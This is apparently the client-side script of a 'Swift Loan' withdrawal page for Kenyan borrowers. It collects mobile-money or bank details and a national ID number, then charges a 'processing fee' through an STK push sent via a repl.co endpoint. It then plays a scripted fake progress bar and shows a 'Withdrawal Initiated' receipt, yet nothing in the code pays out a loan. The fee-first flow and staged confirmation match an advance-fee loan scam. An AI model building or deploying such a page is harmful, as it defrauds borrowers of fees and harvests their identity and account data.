            const title = document.getElementById('detailsModalTitle');
            const formContainer = document.getElementById('withdrawalForm');
            
            let formHTML = '';
            let titleText = '';

            switch(method) {
                case 'mpesa':
                    titleText = 'M-Pesa Withdrawal Details';
                    formHTML = `
                        <div class="space-y-4">
                            <div class="text-center mb-6">
                                <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
                                    <i class="fas fa-mobile-alt text-green-600 text-2xl"></i>
                                </div>
                                <h4 class="text-lg font-semibold">M-Pesa Transfer</h4>
                                <p class="text-sm text-gray-600">Enter your M-Pesa number to receive funds</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-mobile-alt mr-1"></i> M-Pesa Phone Number
                                </label>
                                <input type="tel" id="mpesaPhone" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="254XXXXXXXXX" value="${loanData.phone}" maxlength="12">
                                <div class="error-message hidden" id="mpesaPhoneError"></div>
                                <p class="text-xs text-gray-500 mt-1">Format: 254XXXXXXXXX (without +)</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-user mr-1"></i> Account Name
                                </label>
                                <input type="text" id="mpesaName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter full name as registered" value="${localStorage.getItem('swift_customer_name') || ''}">
                                <div class="error-message hidden" id="mpesaNameError"></div>
                            </div>

                            <div class="bg-green-50 border border-green-200 rounded-lg p-4">
                                <div class="flex items-start space-x-2">
                                    <i class="fas fa-info-circle text-green-600 mt-0.5"></i>
                                    <div class="text-sm text-green-800">
                                        <p class="font-medium mb-1">M-Pesa Transfer Information:</p>
                                        <ul class="text-xs space-y-1">
                                            <li>• You will receive an STK push notification from SwiftWallet Digital Ventures fee request.</li>
                                            <li>• Funds will be credited instantly after confirmation</li>
                                            <li>• Transaction limit: KES 300,000 per day</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                    break;

                case 'airtel':
                    titleText = 'Airtel Money Withdrawal Details';
                    formHTML = `
                        <div class="space-y-4">
                            <div class="text-center mb-6">
                                <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-3">
                                    <i class="fas fa-mobile-alt text-red-600 text-2xl"></i>
                                </div>
                                <h4 class="text-lg font-semibold">Airtel Money Transfer</h4>
                                <p class="text-sm text-gray-600">Enter your Airtel Money number to receive funds</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-mobile-alt mr-1"></i> Airtel Money Phone Number
                                </label>
                                <input type="tel" id="airtelPhone" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="254XXXXXXXXX" value="${loanData.phone}" maxlength="12">
                                <div class="error-message hidden" id="airtelPhoneError"></div>
                                <p class="text-xs text-gray-500 mt-1">Format: 254XXXXXXXXX (without +)</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-user mr-1"></i> Account Name
                                </label>
                                <input type="text" id="airtelName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter full name as registered" value="${localStorage.getItem('swift_customer_name') || ''}">
                                <div class="error-message hidden" id="airtelNameError"></div>
                            </div>

                            <div class="bg-red-50 border border-red-200 rounded-lg p-4">
                                <div class="flex items-start space-x-2">
                                    <i class="fas fa-info-circle text-red-600 mt-0.5"></i>
                                    <div class="text-sm text-red-800">
                                        <p class="font-medium mb-1">Airtel Money Transfer Information:</p>
                                        <ul class="text-xs space-y-1">
                                            <li>• You will receive an SMS notification with code </li>
                                            <li>• Funds will be credited within 2-3 minutes from CHASE BANK</li>
                                            <li>• Transaction limit: KES 150,000 per day</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                    break;

                case 'bank':
                    titleText = 'Bank Transfer Withdrawal Details';
                    const bankOptions = kenyanBanks.map(bank => `<option value="${bank}">${bank}</option>`).join('');
                    formHTML = `
                        <div class="space-y-4">
                            <div class="text-center mb-6">
                                <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
                                    <i class="fas fa-university text-blue-600 text-2xl"></i>
                                </div>
                                <h4 class="text-lg font-semibold">Bank Transfer</h4>
                                <p class="text-sm text-gray-600">Enter your bank details to receive funds</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-university mr-1"></i> Select Bank
                                </label>
                                <select id="bankName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none">
                                    <option value="">Choose your bank...</option>
                                    ${bankOptions}
                                </select>
                                <div class="error-message hidden" id="bankNameError"></div>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-credit-card mr-1"></i> Account Number
                                </label>
                                <input type="text" id="accountNumber" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter your account number" maxlength="20">
                                <div class="error-message hidden" id="accountNumberError"></div>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-user mr-1"></i> Account Holder Name
                                </label>
                                <input type="text" id="accountName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter full name as on bank account" value="${localStorage.getItem('swift_customer_name') || ''}">
                                <div class="error-message hidden" id="accountNameError"></div>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-id-card mr-1"></i> ID Number
                                </label>
                                <input type="text" id="idNumber" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter National ID number" maxlength="8">
                                <div class="error-message hidden" id="idNumberError"></div>
                            </div>

                            <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
                                <div class="flex items-start space-x-2">
                                    <i class="fas fa-info-circle text-blue-600 mt-0.5"></i>
                                    <div class="text-sm text-blue-800">
                                        <p class="font-medium mb-1">Bank Transfer Information:</p>
                                        <ul class="text-xs space-y-1">
                                            <li>• Funds will be credited within 3-5 minutes with approval from CHASE BANK</li>
                                            <li>• Account details must match your loan application</li>
                                            <li>• Transaction limit: KES 1,000,000 per day</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                    break;
            }

            title.textContent = titleText;
            formContainer.innerHTML = formHTML;
            
            modal.classList.remove('hidden');
            modal.classList.add('flex');
        }

        // Close withdrawal details modal
        function closeDetailsModal() {
            document.getElementById('withdrawalDetailsModal').classList.add('hidden');
            document.getElementById('withdrawalDetailsModal').classList.remove('flex');
        }

        // Validate form based on method
        function validateForm() {
            let isValid = true;
            
            // Clear previous errors
            document.querySelectorAll('.error-message').forEach(error => {
                error.classList.add('hidden');
                error.textContent = '';
            });
            
            document.querySelectorAll('.form-field').forEach(field => {
                field.classList.remove('error', 'success');
            });

            switch(selectedWithdrawalMethod) {
                case 'mpesa':
                    isValid = validateMpesaForm() && isValid;
                    break;
                case 'airtel':
                    isValid = validateAirtelForm() && isValid;
                    break;
                case 'bank':
                    isValid = validateBankForm() && isValid;
                    break;
            }

            return isValid;
        }

        function validateMpesaForm() {
            let isValid = true;
            
            const phone = document.getElementById('mpesaPhone');
            const name = document.getElementById('mpesaName');
            
            // Validate phone
            if (!phone.value.trim()) {
                showFieldError('mpesaPhone', 'mpesaPhoneError', 'Phone number is required');
                isValid = false;
            } else if (!/^254[0-9]{9}$/.test(phone.value.trim())) {
                showFieldError('mpesaPhone', 'mpesaPhoneError', 'Enter valid format: 254XXXXXXXXX');
                isValid = false;
            } else {
                showFieldSuccess('mpesaPhone');
            }
            
            // Validate name
            if (!name.value.trim()) {
                showFieldError('mpesaName', 'mpesaNameError', 'Account name is required');
                isValid = false;
            } else if (name.value.trim().length < 2) {
                showFieldError('mpesaName', 'mpesaNameError', 'Enter a valid full name');
                isValid = false;
            } else {
                showFieldSuccess('mpesaName');
            }
            
            return isValid;
        }

        function validateAirtelForm() {
            let isValid = true;
            
            const phone = document.getElementById('airtelPhone');
            const name = document.getElementById('airtelName');
            
            // Validate phone
            if (!phone.value.trim()) {
                showFieldError('airtelPhone', 'airtelPhoneError', 'Phone number is required');
                isValid = false;
            } else if (!/^254[0-9]{9}$/.test(phone.value.trim())) {
                showFieldError('airtelPhone', 'airtelPhoneError', 'Enter valid format: 254XXXXXXXXX');
                isValid = false;
            } else {
                showFieldSuccess('airtelPhone');
            }
            
            // Validate name
            if (!name.value.trim()) {
                showFieldError('airtelName', 'airtelNameError', 'Account name is required');
                isValid = false;
            } else if (name.value.trim().length < 2) {
                showFieldError('airtelName', 'airtelNameError', 'Enter a valid full name');
                isValid = false;
            } else {
                showFieldSuccess('airtelName');
            }
            
            return isValid;
        }

        function validateBankForm() {
            let isValid = true;
            
            const bankName = document.getElementById('bankName');
            const accountNumber = document.getElementById('accountNumber');
            const accountName = document.getElementById('accountName');
            const idNumber = document.getElementById('idNumber');
            
            // Validate bank
            if (!bankName.value) {
                showFieldError('bankName', 'bankNameError', 'Please select a bank');
                isValid = false;
            } else {
                showFieldSuccess('bankName');
            }
            
            // Validate account number
            if (!accountNumber.value.trim()) {
                showFieldError('accountNumber', 'accountNumberError', 'Account number is required');
                isValid = false;
            } else if (!/^[0-9]{6,20}$/.test(accountNumber.value.trim())) {
                showFieldError('accountNumber', 'accountNumberError', 'Enter a valid account number (6-20 digits)');
                isValid = false;
            } else {
                showFieldSuccess('accountNumber');
            }
            
            // Validate account name
            if (!accountName.value.trim()) {
                showFieldError('accountName', 'accountNameError', 'Account holder name is required');
                isValid = false;
            } else if (accountName.value.trim().length < 2) {
                showFieldError('accountName', 'accountNameError', 'Enter a valid full name');
                isValid = false;
            } else {
                showFieldSuccess('accountName');
            }
            
            // Validate ID number
            if (!idNumber.value.trim()) {
                showFieldError('idNumber', 'idNumberError', 'ID number is required');
                isValid = false;
            } else if (!/^[0-9]{7,8}$/.test(idNumber.value.trim())) {
                showFieldError('idNumber', 'idNumberError', 'Enter a valid ID number (7-8 digits)');
                isValid = false;
            } else {
                showFieldSuccess('idNumber');
            }
            
            return isValid;
        }

        function showFieldError(fieldId, errorId, message) {
            const field = document.getElementById(fieldId);
            const error = document.getElementById(errorId);
            
            field.classList.add('error');
            error.textContent = message;
            error.classList.remove('hidden');
        }

        function showFieldSuccess(fieldId) {
            const field = document.getElementById(fieldId);
            field.classList.add('success');
        }

        // Process withdrawal (Fee payment first)
        async function processWithdrawal() {
            if (isProcessing) return;
            
            if (!validateForm()) {
                return;
            }

            isProcessing = true;
            closeDetailsModal();
            showEnhancedProcessingOverlay();

            try {
                // Get fee amount from loan data
                const feeAmount = parseFloat(loanData.fee);
                
                // Collect form data for later use
                let withdrawalData = {
                    method: selectedWithdrawalMethod,
                    loanId: loanData.tracking
                };

                let paymentPhone = loanData.phone; // Default to loan phone

                switch(selectedWithdrawalMethod) {
                    case 'mpesa':
                        paymentPhone = document.getElementById('mpesaPhone').value;
                        withdrawalData.phone = paymentPhone;
                        withdrawalData.name = document.getElementById('mpesaName').value;
                        break;
                    case 'airtel':
                        paymentPhone = document.getElementById('airtelPhone').value;
                        withdrawalData.phone = paymentPhone;
                        withdrawalData.name = document.getElementById('airtelName').value;
                        break;
                    case 'bank':
                        withdrawalData.bankName = document.getElementById('bankName').value;
                        withdrawalData.accountNumber = document.getElementById('accountNumber').value;
                        withdrawalData.accountName = document.getElementById('accountName').value;
                        withdrawalData.idNumber = document.getElementById('idNumber').value;
                        break;
                }

                console.log('Processing fee payment for withdrawal:', withdrawalData);

                // Store withdrawal data for after fee payment
                localStorage.setItem('swift_pending_withdrawal', JSON.stringify(withdrawalData));

                // Step 1: Initiate fee payment via API
                const feeResponse = await fetch('https://swift-loan-api.redscarf25.repl.co/swiftloan-ventures/process-fee', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone: paymentPhone,
                        amount: feeAmount,
                        loanId: loanData.tracking,
                        withdrawalMethod: selectedWithdrawalMethod
                    })
                });

                if (!feeResponse.ok) {
                    throw new Error('Fee payment request failed');
                }

                const feeData = await feeResponse.json();
                console.log('Fee payment response:', feeData);

                // Hide processing overlay
                hideProcessingOverlay();

                // Show success with fee payment details
                showWithdrawalSuccess(withdrawalData, feeData);

            } catch (error) {
                console.error('Withdrawal error:', error);
                hideProcessingOverlay();
                showError('Failed to process withdrawal. Please try again or contact support.');
                isProcessing = false;
            }
        }

        // Show enhanced processing overlay
        function showEnhancedProcessingOverlay() {
            document.getElementById('processingOverlay').classList.remove('hidden');
        }

        // Hide processing overlay
        function hideProcessingOverlay() {
            document.getElementById('processingOverlay').classList.add('hidden');
        }

        // Show withdrawal success
        function showWithdrawalSuccess(withdrawalData, feeData) {
            isProcessing = false;
            
            const loanAmount = parseFloat(loanData.amount);
            const feeAmount = parseFloat(loanData.fee);
            const withdrawalAmount = loanAmount - feeAmount;

            const methodNames = {
                'mpesa': 'M-Pesa',
                'airtel': 'Airtel Money',
                'bank': 'Bank Transfer'
            };

            const methodIcons = {
                'mpesa': 'fas fa-mobile-alt',
                'airtel': 'fas fa-mobile-alt', 
                'bank': 'fas fa-university'
            };

            const methodName = methodNames[selectedWithdrawalMethod];
            const methodIcon = methodIcons[selectedWithdrawalMethod];

            // Update method logo
            document.getElementById('selectedMethodLogo').innerHTML = `<i class="${methodIcon} text-white text-xl"></i>`;
            document.getElementById('selectedMethodName').textContent = methodName;

            // Show success alert
            const successAlert = document.getElementById('successAlert');
            const successMessage = document.getElementById('successMessage');
            
            successMessage.textContent = `Your withdrawal of KES ${withdrawalAmount.toLocaleString()} to ${methodName} has been initiated. Please approve the STK push on your phone.`;
            
            successAlert.classList.remove('hidden');
            successAlert.scrollIntoView({ behavior: 'smooth', block: 'center' });

            // Start progress bar simulation
            startProgressSimulation();

            // Generate receipt
            generateReceipt(withdrawalData, feeData);
        }

        // Start progress bar simulation
        function startProgressSimulation() {
            const progressBar = document.getElementById('progressBar');
            const progressText = document.getElementById('progressText');
            let progress = 0;
            
            const statuses = [
                { progress: 20, text: 'Verifying account details...' },
                { progress: 40, text: 'Processing fee payment...' },
                { progress: 60, text: 'Connecting to payment gateway...' },
                { progress: 80, text: 'Initiating withdrawal...' },
                { progress: 100, text: 'Withdrawal initiated successfully!' }
            ];
            
            let currentStatus = 0;
            
            const interval = setInterval(() => {
                if (currentStatus < statuses.length) {
                    const status = statuses[currentStatus];
                    progressBar.style.width = status.progress + '%';
                    progressText.textContent = status.text;
                    currentStatus++;
                } else {
                    clearInterval(interval);
                    progressBar.classList.add('bg-green-600');
                }
            }, 1500);
        }

        // Generate receipt
        function generateReceipt(withdrawalData, feeData) {
            const loanAmount = parseFloat(loanData.amount);
            const feeAmount = parseFloat(loanData.fee);
            const withdrawalAmount = loanAmount - feeAmount;
            const transactionId = feeData.transactionId || 'TXN' + Date.now();
            const timestamp = new Date().toLocaleString('en-KE', { 
                timeZone: 'Africa/Nairobi',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit'
            });

            const methodNames = {
                'mpesa': 'M-Pesa',
                'airtel': 'Airtel Money',
                'bank': 'Bank Transfer'
            };

            let destinationDetails = '';
            if (withdrawalData.method === 'mpesa' || withdrawalData.method === 'airtel') {
                destinationDetails = `
                    <div class="flex justify-between text-sm">
                        <span class="text-gray-600">Phone Number:</span>
                        <span class="font-semibold">${withdrawalData.phone}</span>
                    </div>
                    <div class="flex justify-between text-sm">
                        <span class="text-gray-600">Account Name:</span>
                        <span class="font-semibold">${withdrawalData.name}</span>
                    </div>
                `;
            } else {
                destinationDetails = `
                    <div class="flex justify-between text-sm">
                        <span class="text-gray-600">Bank:</span>
                        <span class="font-semibold">${withdrawalData.bankName}</span>
                    </div>
                    <div class="flex justify-between text-sm">
                        <span class="text-gray-600">Account Number:</span>
                        <span class="font-semibold">${withdrawalData.accountNumber}</span>
                    </div>
                    <div class="flex justify-between text-sm">
                        <span class="text-gray-600">Account Holder:</span>
                        <span class="font-semibold">${withdrawalData.accountName}</span>
                    </div>
                `;
            }

            const receiptHTML = `
                <div class="bg-white rounded-xl shadow-lg border-2 border-green-300 overflow-hidden">
                    <!-- Receipt Header -->
                    <div class="bg-gradient-to-r from-primary to-orange-600 text-white p-6 text-center">
                        <div class="hidden print:flex items-center justify-center mb-2">
                            <div class="w-10 h-10 bg-white rounded-lg flex items-center justify-center mr-3">
                                <i class="fas fa-wallet text-primary text-xl"></i>
                            </div>
                            <span class="text-xl font-bold">Swift Loan</span>
                        </div>
                        <i class="fas fa-receipt text-3xl mb-2"></i>
                        <h3 class="text-xl font-bold">Withdrawal Receipt</h3>
                        <p class="text-sm opacity-90">Transaction Confirmation</p>
                    </div>

                    <!-- Receipt Body -->
                    <div class="p-6 space-y-4">
                        <!-- Transaction Info -->
                        <div class="bg-gray-50 rounded-lg p-4 space-y-2">
                            <div class="flex justify-between text-sm">
                                <span class="text-gray-600">Transaction ID:</span>
                                <span class="font-mono font-semibold text-primary">${transactionId}</span>
                            </div>
                            <div class="flex justify-between text-sm">
                                <span class="text-gray-600">Date & Time:</span>
                                <span class="font-semibold">${timestamp}</span>
                            </div>
                            <div class="flex justify-between text-sm">
                                <span class="text-gray-600">Loan ID:</span>
                                <span class="font-semibold">${loanData.tracking}</span>
                            </div>
                        </div>

                        <!-- Amount Details -->
                        <div class="border-t pt-4 space-y-2">
                            <h4 class="font-semibold text-gray-800 mb-2">Amount Details</h4>
                            <div class="flex justify-between text-sm">
                                <span class="text-gray-600">Loan Amount:</span>
                                <span class="font-semibold">KES ${loanAmount.toLocaleString()}</span>
                            </div>
                            <div class="flex justify-between text-sm">
                                <span class="text-gray-600">Processing Fee:</span>
                                <span class="font-semibold text-primary">-KES ${feeAmount.toLocaleString()}</span>
                            </div>
                            <div class="flex justify-between text-base font-bold border-t pt-2">
                                <span>Withdrawal Amount:</span>
                                <span class="text-green-600">KES ${withdrawalAmount.toLocaleString()}</span>
                            </div>
                        </div>

                        <!-- Destination Details -->
                        <div class="border-t pt-4 space-y-2">
                            <h4 class="font-semibold text-gray-800 mb-2">Destination</h4>
                            <div class="flex justify-between text-sm">
                                <span class="text-gray-600">Method:</span>
                                <span class="font-semibold">${methodNames[withdrawalData.method]}</span>
                            </div>
                            ${destinationDetails}
                        </div>

                        <!-- Status -->
                        <div class="bg-green-50 border border-green-200 rounded-lg p-3 text-center">
                            <i class="fas fa-check-circle text-green-600 text-2xl mb-2"></i>
                            <p class="font-semibold text-green-800">Withdrawal Initiated</p>
                            <p class="text-xs text-green-700 mt-1">Funds will be credited within stated timeframe</p>
                        </div>

                        <!-- Actions -->
                        <div class="flex gap-3 pt-4 border-t print:hidden">
                            <button onclick="window.print()" class="flex-1 px-4 py-3 bg-gray-100 hover:bg-gray-200 text-gray-800 rounded-lg transition flex items-center justify-center">
                                <i class="fas fa-print mr-2"></i>
                                Print Receipt
                            </button>
                            <button onclick="downloadReceipt()" class="flex-1 px-4 py-3 bg-gradient-to-r from-primary to-orange-600 hover:from-primary-dark hover:to-orange-700 text-white rounded-lg transition flex items-center justify-center">
                                <i class="fas fa-download mr-2"></i>
                                Download
                            </button>
                        </div>
                    </div>

                    <!-- Footer -->
                    <div class="bg-gray-50 px-6 py-4 text-center text-xs text-gray-600 border-t">
                        <p class="mb-1">Thank you for choosing Swift Loan</p>
                        <p>For support, contact: support@swiftloan.ke | +254 700 000 000</p>
                    </div>
                </div>
            `;

            document.getElementById('receiptCardContainer').innerHTML = receiptHTML;
        }

        // Download receipt function
        function downloadReceipt() {
            window.print();
        }

        // Show error
        function showError(message) {
            const errorAlert = document.getElementById('errorAlert');
            const errorMessage = document.getElementById('errorMessage');
            
            errorMessage.textContent = message;
            errorAlert.classList.remove('hidden');
            errorAlert.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }

        // Hide error
        function hideError() {
            document.getElementById('errorAlert').classList.add('hidden');
        }

        // Open help modal
        function openHelpModal() {
            document.getElementById('helpModal').classList.remove('hidden');
            document.getElementById('helpModal').classList.add('flex');
        }

        // Close help modal
        function closeHelpModal() {
            document.getElementById('helpModal').classList.add('hidden');
            document.getElementById('helpModal').classList.remove('flex');
        }

        // Go back function
        function goBack() {
            window.history.back();
        }

        // Load data on page load
        window.addEventListener('DOMContentLoaded', loadLoanData);
    </script>
</body>
</html>
